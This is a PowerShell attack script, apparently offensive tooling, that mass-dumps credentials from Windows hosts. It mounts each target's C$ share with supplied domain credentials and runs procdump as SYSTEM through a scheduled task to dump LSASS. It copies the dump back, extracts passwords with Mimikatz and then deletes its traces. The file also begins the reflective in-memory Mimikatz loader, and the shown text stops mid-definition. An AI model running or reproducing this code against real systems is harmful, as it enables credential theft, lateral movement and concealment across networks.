function Invoke-MassSchtasksMimikatz{

Param(
 [Parameter(Position = 0, Mandatory = $true)]
 [string]
 $HostList,

 [Parameter(Position = 1, Mandatory = $true)]
 [string]
 $Domain,

 [Parameter(Position = 2, Mandatory = $true)]
 [string]
 $User,

 [Parameter(Position = 3, Mandatory = $true)]
 [string]
 $Pass
)

Get-Content $HostList | Foreach-Object {Invoke-SchtasksMimikatz($_, $Domain, $User, $Pass)}

}

function Invoke-SchtasksMimikatz{

Param(
 [Parameter(Position = 0, Mandatory = $true)]
 [string]
 $ComputerName,

 [Parameter(Position = 1, Mandatory = $true)]
 [string]
 $Domain,

 [Parameter(Position = 2, Mandatory = $true)]
 [string]
 $User,

 [Parameter(Position = 3, Mandatory = $true)]
 [string]
 $Pass
)

Write-Host "##### Mounting a share to \\$ComputerName\C$ at X: #####"
$netuse_command = "cmd.exe /C net use X: \\$ComputerName\C$ /user:$Domain\$User $Pass"
Invoke-Expression -Command:$netuse_command

Write-Host "##### Making a dir called 'pd' on the remote host #####"
$mkdir = "cmd.exe /C mkdir X:\pd"
Invoke-Expression -Command:$mkdir

Write-Host "##### Copying over procdump.ps1 to X:\pd\ #####"
$copy_procdump = "cmd.exe /C copy C:\pd\procdump.ps1 X:\pd\#####"
Invoke-Expression -Command:$copy_procdump

Write-Host "##### Scheduling a task called pd to create a memory dump of the LSASS process using procdump.ps1 #####"
$create_schtask = "cmd.exe /C schtasks /Create /TN pd /S $ComputerName /U $Domain\$User /P $Pass /SC ONCE /ST 22:00:00 /TR 'powershell.exe -exec bypass -file C:\pd\procdump.ps1' /RU SYSTEM"
Invoke-Expression -Command:$create_schtask

Write-Host "##### Running the scheduled task #####"
$run_schtask = "cmd.exe /C schtasks /Run /S $ComputerName /TN pd /U $Domain\$User /P $Pass"
Invoke-Expression -Command:$run_schtask

Write-Host "##### Sleeping for 8 seconds #####"
Start-Sleep -s 8

Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
$create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
Invoke-Expression -Command:$create_compdir

Write-Host "##### Copying LSASS dump from remote host to local directory C:\pd\$ComputerName-dumps #####"
$copy_dumps = "cmd.exe /C copy X:\pd\*.dmp C:\pd\$ComputerName-dumps\"
Invoke-Expression -Command:$copy_dumps

Write-Host "##### Changing name of dump file to lsass.dmp #####"
$change_name = "cmd.exe /C move C:\pd\$ComputerName-dumps\*.dmp C:\pd\$ComputerName-dumps\lsass.dmp"
Invoke-Expression -Command:$change_name

Write-Host "##### Copying lsass.dmp file to C:\pd\ for use with Mimikatz #####"
$copy_to_pd = "cmd.exe /C copy C:\pd\$ComputerName-dumps\lsass.dmp C:\pd\"
Invoke-Expression -Command:$copy_to_pd

Write-Host "##### Extracting credentials from lsass.dmp file with Mimikatz #####"
Invoke-Mimikatz -Command '"sekurlsa::minidump C:\pd\lsass.DMP" sekurlsa::logonPasswords exit >> report.txt'

Write-Host "##### Sleeping for 5 seconds #####"
Start-Sleep -s 5

Write-Host "##### Starting cleanup on remote host #####"
Write-Host "##### Removing C:\pd directory from remote host #####"
$cleanup_remote_system = "cmd.exe /C rmdir /q /s X:\pd"
Invoke-Expression -Command:$cleanup_remote_system

Write-Host "##### Removing X: share from local system #####"
$cleanup_share = "cmd.exe /C net use X: /delete"
Invoke-Expression -Command:$cleanup_share

Write-Host "##### Deleting pd scheduled task on remote system #####"
$cleanup_schtask = "cmd.exe /C schtasks /Delete /TN pd /F /S $ComputerName /U $Domain\$User /P $Pass"
Invoke-Expression -Command:$cleanup_schtask
}
function Invoke-Mimikatz
{
<#
.SYNOPSIS

This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
dump credentials without ever writing the mimikatz binary to disk. 
The script has a ComputerName parameter which allows it to be executed against multiple computers.

This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Mimikatz version: 2.0 alpha (12/14/2015)

.DESCRIPTION

Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
functionality provided with Mimikatz.

.PARAMETER DumpCreds

Switch: Use mimikatz to dump credentials out of LSASS.

.PARAMETER DumpCerts

Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).

.PARAMETER Command

Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.
	
.EXAMPLE

Execute mimikatz on the local computer to dump certificates.
Invoke-Mimikatz -DumpCerts

.EXAMPLE

Execute mimikatz on two remote computers to dump credentials.
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")

.EXAMPLE

Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"

.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com

.LINK

http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
#>

[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $DumpCreds,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
